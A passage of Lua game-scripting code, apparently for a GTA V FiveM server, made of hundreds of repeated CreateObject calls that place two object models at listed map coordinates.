            Citizen.Wait(0)
        CreateObject(4185368029, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(566160949, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
